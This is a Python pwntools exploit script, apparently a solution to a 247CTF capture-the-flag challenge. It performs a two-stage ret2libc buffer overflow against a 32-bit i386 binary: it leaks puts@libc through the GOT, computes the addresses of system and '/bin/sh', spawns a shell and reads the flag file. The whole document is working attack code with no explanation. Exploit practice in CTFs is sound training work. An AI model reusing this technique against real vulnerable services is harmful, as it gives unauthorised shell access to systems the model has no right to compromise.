#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

HOST = "3ce38ede980ff204.247ctf.com"
PORT = 50010

# Addresses from binary
PUTS_PLT = 0x08048390
PUTS_GOT = 0x0804a018
MAIN = 0x0804853d
OFFSET = 44

# Libc offsets (libc6-i386 2.27-3ubuntu1)
PUTS_OFFSET = 0x67360
SYSTEM_OFFSET = 0x3cd10
BINSH_OFFSET = 0x17b8cf

def exploit():
    io = remote(HOST, PORT)
    
    # Stage 1: Leak puts@libc
    payload1 = b'A' * OFFSET
    payload1 += p32(PUTS_PLT)    # call puts
    payload1 += p32(MAIN)        # return to main  
    payload1 += p32(PUTS_GOT)    # arg: puts@got
    
    io.recvline()
    io.sendline(payload1)
    io.recvline()
    
    # Parse leak
    leak = io.recvline()
    puts_libc = u32(leak[:4])
    print(f"[+] Leaked puts@libc: {hex(puts_libc)}")
    
    # Calculate libc addresses
    libc_base = puts_libc - PUTS_OFFSET
    system_addr = libc_base + SYSTEM_OFFSET
    binsh_addr = libc_base + BINSH_OFFSET
    print(f"[+] Libc base: {hex(libc_base)}")
    
    # Stage 2: system("/bin/sh")
    io.recvline()
    payload2 = b'A' * OFFSET
    payload2 += p32(system_addr)
    payload2 += p32(0)           # fake return
    payload2 += p32(binsh_addr)  # "/bin/sh"
    
    io.sendline(payload2)
    io.sendline(b'cat flag*')
    print(io.recvall(timeout=3).decode())

if __name__ == "__main__":
    exploit()
